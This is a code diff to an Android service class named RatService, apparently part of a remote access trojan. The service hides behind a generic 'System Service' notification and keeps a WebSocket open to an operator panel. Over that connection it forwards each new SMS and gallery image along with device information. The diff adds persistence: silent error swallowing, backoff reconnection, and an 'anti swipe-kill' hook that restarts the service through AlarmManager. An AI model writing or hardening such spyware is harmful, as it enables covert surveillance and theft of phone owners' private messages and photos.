@@ -1,6 +1,7 @@
 package com.system.update
 
 import android.app.*
+import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
@@ -15,6 +16,7 @@ class RatService : Service() {
     private val client = OkHttpClient.Builder()
         .readTimeout(0, TimeUnit.MILLISECONDS)
         .pingInterval(20, TimeUnit.SECONDS)
+        .connectTimeout(15, TimeUnit.SECONDS)
         .build()
 
     private var ws: WebSocket? = null
@@ -24,6 +26,7 @@ class RatService : Service() {
     private lateinit var handler: CommandHandler
     private var smsWatcher: SmsWatcher? = null
     private var galleryWatcher: GalleryWatcher? = null
+    private var reconnectAttempts = 0
 
     override fun onCreate() {
         super.onCreate()
@@ -34,26 +37,21 @@ class RatService : Service() {
         handler = CommandHandler(this, deviceId)
 
         smsWatcher = SmsWatcher(this) { sms ->
-            sendEvent(mapOf(
-                "type" to "sms_new",
-                "data" to sms
-            ))
+            sendEvent(mapOf("type" to "sms_new", "data" to sms))
         }
-
         galleryWatcher = GalleryWatcher(this) { img ->
-            sendEvent(mapOf(
-                "type" to "gallery_new",
-                "data" to img
-            ))
+            sendEvent(mapOf("type" to "gallery_new", "data" to img))
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(1, buildNotification())
-        connect()
-        startHeartbeat()
-        smsWatcher?.start()
-        galleryWatcher?.start()
+        startForeground(NOTIF_ID, buildNotification())
+        if (ws == null) {
+            connect()
+            startHeartbeat()
+        }
+        try { smsWatcher?.start() } catch (_: Exception) {}
+        try { galleryWatcher?.start() } catch (_: Exception) {}
         return START_STICKY
     }
 
@@ -64,8 +62,8 @@ class RatService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         return NotificationCompat.Builder(this, App.CHANNEL_ID)
-            .setContentTitle("System Update")
-            .setContentText("Service berjalan")
+            .setContentTitle("System Service")
+            .setContentText("Running")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setContentIntent(pi)
             .setOngoing(true)
@@ -73,12 +71,17 @@ class RatService : Service() {
             .build()
     }
 
+    // ============================================================
+    // CONNECT
+    // ============================================================
     private fun connect() {
         val cfg = App.config
         val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=${cfg.username}"
         val req = Request.Builder().url(url).build()
+
         ws = client.newWebSocket(req, object : WebSocketListener() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
+                reconnectAttempts = 0
                 sendInfo(webSocket)
             }
 
@@ -103,18 +106,27 @@ class RatService : Service() {
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 if (running) {
-                    Thread.sleep(App.config.reconnectDelayMs)
-                    connect()
+                    scheduleReconnect()
                 }
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 if (running) {
-                    Thread.sleep(App.config.reconnectDelayMs)
-                    connect()
+                    scheduleReconnect()
                 }
             }
         })
+    }
+
+    private fun scheduleReconnect() {
+        val delay = minOf(30000L, 2000L * (reconnectAttempts + 1))
+        reconnectAttempts++
+        Thread {
+            try { Thread.sleep(delay) } catch (_: Exception) {}
+            if (running) {
+                try { connect() } catch (_: Exception) {}
+            }
+        }.start()
     }
 
     private fun sendEvent(data: Map<String, Any>) {
@@ -128,11 +140,13 @@ class RatService : Service() {
     }
 
     private fun sendInfo(socket: WebSocket) {
-        val payload = JsonObject().apply {
-            addProperty("type", "info")
-            add("info", gson.toJsonTree(handler.collectInfo()))
-        }
-        socket.send(gson.toJson(payload))
+        try {
+            val payload = JsonObject().apply {
+                addProperty("type", "info")
+                add("info", gson.toJsonTree(handler.collectInfo()))
+            }
+            socket.send(gson.toJson(payload))
+        } catch (_: Exception) {}
     }
 
     private fun startHeartbeat() {
@@ -146,13 +160,33 @@ class RatService : Service() {
         }.start()
     }
 
+    // ============================================================
+    // ON TASK REMOVED (anti swipe-kill)
+    // ============================================================
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        try {
+            val restart = Intent(applicationContext, RatService::class.java)
+            val pi = PendingIntent.getService(
+                this, 2, restart,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, pi)
+        } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
+
     override fun onDestroy() {
         running = false
-        smsWatcher?.stop()
-        galleryWatcher?.stop()
+        try { smsWatcher?.stop() } catch (_: Exception) {}
+        try { galleryWatcher?.stop() } catch (_: Exception) {}
         try { ws?.close(1000, "stop") } catch (_: Exception) {}
         super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    companion object {
+        const val NOTIF_ID = 1
+    }
 }
